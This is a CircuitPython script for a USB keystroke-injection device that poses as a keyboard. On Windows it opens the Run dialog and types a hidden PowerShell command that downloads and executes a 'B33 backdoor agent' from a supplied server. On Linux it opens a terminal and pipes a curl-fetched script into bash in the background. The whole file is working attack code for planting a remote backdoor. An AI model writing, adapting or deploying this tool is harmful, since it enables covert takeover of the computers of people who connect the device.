import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

_CHAR_DELAY = 0.02   # seconds between keystrokes
_KEY_HOLD   = 0.1    # seconds to hold modifier combos


def _make_keyboard():
    return Keyboard(usb_hid.devices), KeyboardLayoutUS


def _type_string(layout, text):
    for ch in text:
        layout.write(ch)
        time.sleep(_CHAR_DELAY)


def _press_keys(keyboard, *keycodes):
    keyboard.press(*keycodes)
    time.sleep(_KEY_HOLD)
    keyboard.release_all()
    time.sleep(_KEY_HOLD)


def deploy_windows(server_url, api_key):
    """
    Open Run dialog and execute a PowerShell one-liner that downloads
    and installs the B33 backdoor agent (Phase 6 deliverable).
    """
    keyboard, LayoutClass = _make_keyboard()
    layout = LayoutClass(keyboard)

    # WIN + R  → open Run dialog
    _press_keys(keyboard, Keycode.WINDOWS, Keycode.R)
    time.sleep(0.5)

    # Type: powershell -WindowStyle Hidden -Command "..."
    cmd = (
        f'powershell -WindowStyle Hidden -Command "'
        f'$env:B33_SERVER=\'{server_url}\';'
        f'$env:B33_KEY=\'{api_key}\';'
        f'IEX((New-Object Net.WebClient).DownloadString(\'$env:B33_SERVER/agent/windows\'))'
        f'"'
    )
    _type_string(layout, cmd)
    time.sleep(0.2)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()


def deploy_linux(server_url, api_key):
    """
    Open terminal and execute a bash one-liner (Phase 6 deliverable).
    """
    keyboard, LayoutClass = _make_keyboard()
    layout = LayoutClass(keyboard)

    # CTRL + ALT + T → open terminal
    _press_keys(keyboard, Keycode.CONTROL, Keycode.ALT, Keycode.T)
    time.sleep(1.5)

    cmd = (
        f'B33_SERVER="{server_url}" B33_KEY="{api_key}" '
        f'bash <(curl -fsSL {server_url}/agent/linux) &'
    )
    _type_string(layout, cmd)
    time.sleep(0.2)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
